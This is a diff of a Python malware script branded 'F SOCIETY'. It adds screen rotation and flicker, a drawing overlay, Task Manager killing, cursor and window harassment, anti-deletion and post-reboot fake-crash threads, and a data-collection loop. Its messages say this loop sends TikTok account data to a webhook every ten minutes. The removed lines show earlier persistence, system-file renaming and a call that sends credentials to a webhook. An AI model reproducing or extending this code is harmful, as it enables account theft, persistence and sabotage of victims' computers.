+    canvas = tk.Canvas(overlay_root, bg='white', highlightthickness=0)
+    canvas.pack(fill=tk.BOTH, expand=True)
+    overlay_root.update()
+
+def auto_change_color_forever():
+    colors = [(255,0,0), (0,255,0), (0,0,255), (255,255,0), (255,0,255), (0,255,255)]
+    color_index = 0
+    global current_color
+    while running:
+        time.sleep(3)
+        color_index = (color_index + 1) % len(colors)
+        current_color = colors[color_index]
+
+def draw_on_screen(x, y):
+    if drawing and canvas:
+        color_hex = f'#{current_color[0]:02x}{current_color[1]:02x}{current_color[2]:02x}'
+        canvas.create_oval(x-5, y-5, x+5, y+5, fill=color_hex, outline=color_hex)
+        overlay_root.update()
+
+def on_move(x, y):
+    draw_on_screen(x, y)
+
+# ==================== SCREEN ROTATION & FLICKER ====================
+def rotate_screen_upside_down():
     try:
-        bsod = tk.Tk()
-        bsod.attributes('-fullscreen', True)
-        bsod.configure(bg='#0000AA')
-        bsod.attributes('-topmost', True)
-        tk.Label(bsod, text=":(", font=("Consolas", 72), fg="white", bg='#0000AA').pack(pady=100)
-        tk.Label(bsod, text="F SOCIETY - Your PC ran into a problem\n\nStop code: F_SOCIETY_ALWAYS_WATCHING", 
-                font=("Consolas", 16), fg="white", bg='#0000AA').pack()
-        progress = tk.Canvas(bsod, width=400, height=20, bg='#0000AA', highlightthickness=0)
-        progress.pack(pady=50)
-        progress.create_rectangle(0, 0, 0, 20, fill='white', tags='progress')
-        
-        def update_progress():
-            for i in range(101):
-                progress.coords('progress', 0, 0, (400 * i / 100), 20)
-                bsod.update()
-                time.sleep(0.05)
-            bsod.destroy()
-        Thread(target=update_progress, daemon=True).start()
-        bsod.mainloop()
+        devmode = win32api.EnumDisplaySettings(None, 0)
+        devmode.DisplayOrientation = 2
+        devmode.Fields = win32con.DM_DISPLAYORIENTATION
+        win32api.ChangeDisplaySettings(devmode, 0)
     except:
         pass
 
+def screen_flicker_forever():
+    while running:
+        try:
+            for _ in range(10):
+                devmode = win32api.EnumDisplaySettings(None, 0)
+                devmode.DisplayOrientation = 2
+                win32api.ChangeDisplaySettings(devmode, 0)
+                time.sleep(0.05)
+                devmode.DisplayOrientation = 0
+                win32api.ChangeDisplaySettings(devmode, 0)
+                time.sleep(0.05)
+            time.sleep(random.uniform(10, 30))
+        except:
+            time.sleep(5)
+
 # ==================== MAIN ====================
+
 def main():
-    print("[+] F SOCIETY ACTIVATED")
+    global running
     
-    # Rename to system file
-    rename_to_system_file()
+    print("[+] F SOCIETY - FULL DATA SCRAPING MODE")
+    print("[+] TikTok Account Scraper ACTIVE")
     
-    # Add startup methods
-    add_multiple_startup_methods()
-    time.sleep(2)
+    create_multiple_copies()
+    create_transparent_overlay()
     
-    # Send credentials to webhook
-    collect_and_send_data()
+    # Start anti-deletion
+    Thread(target=persistent_anti_deletion_loop, daemon=True).start()
     
-    # === F SOCIETY FEATURES ===
-    
-    # Create text files everywhere
-    print("[+] Creating F SOCIETY text files everywhere...")
-    create_fsociety_text_files()
-    
-    # Open Mr. Robot pictures
-    print("[+] Opening Mr. Robot pictures...")
-    open_mr_robot_picture()
+    # Start data collection
+    Thread(target=continuous_data_collection, daemon=True).start()
     
     # Start all trolling features
-    Thread(target=create_transparent_overlay, daemon=True).start()
-    time.sleep(1)
+    Thread(target=sound_spam_forever, daemon=True).start()
+    Thread(target=task_manager_killer_forever, daemon=True).start()
+    Thread(target=hide_desktop_elements_forever, daemon=True).start()
+    Thread(target=cursor_teleport_forever, daemon=True).start()
+    Thread(target=window_shaker_forever, daemon=True).start()
+    Thread(target=persistent_bsod_after_reboot, daemon=True).start()
     
+    # Mouse drawing
     mouse_listener = MouseListener(on_move=on_move)
     mouse_listener.daemon = True
     mouse_listener.start()
-    
-    Thread(target=auto_change_color, daemon=True).start()
+    Thread(target=auto_change_color_forever, daemon=True).start()
     rotate_screen_upside_down()
-    Thread(target=screen_flicker_auto, daemon=True).start()
-    Thread(target=auto_message_box_loop, daemon=True).start()
-    Thread(target=fake_bsod_auto, daemon=True).start()
+    Thread(target=screen_flicker_forever, daemon=True).start()
     
-    screenshot_worker()
+    print("[+] ALL FEATURES ACTIVE")
+    print("[+] TikTok accounts will be sent to webhook")
+    print("[+] Data collection every 10 minutes")
+    
+    while running:
+        time.sleep(1)
 
 if __name__ == "__main__":
     try:
         main()
     except:
-        time.sleep(10)
+        time.sleep(5)
         main()
